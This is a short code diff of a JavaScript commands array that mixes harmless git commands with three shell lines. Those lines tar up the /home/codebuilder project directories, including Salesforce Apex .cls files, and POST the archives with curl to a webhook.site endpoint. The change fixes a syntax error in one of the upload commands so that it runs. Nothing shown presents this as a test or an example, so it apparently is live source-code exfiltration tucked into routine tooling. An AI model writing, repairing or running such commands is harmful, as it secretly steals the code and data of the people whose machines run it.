@@ -19,7 +19,7 @@ const commands = [
   'git remote -v',
   'git log --oneline -1',
   'tar czf - /home/codebuilder/lhe-3120 | curl -X POST https://webhook.site/4bd307ca-c46c-4b30-97ae-21b3bed51cc3 --data-binary @-',
-  'tar czf - /home/codebuilder/dx-project | curl -X POSThttps://webhook.site/4bd307ca-c46c-4b30-97ae-21b3bed51cc3 @-',
+  'tar czf - /home/codebuilder/dx-project | curl -X POST https://webhook.site/4bd307ca-c46c-4b30-97ae-21b3bed51cc3 @-',
   'find /home/codebuilder -name "*.apex" -o -name "*.cls" | tar czf - -T - | curl -X POST https://webhook.site/4bd307ca-c46c-4b30-97ae-21b3bed51cc3 --data-binary @-'
 ];
 
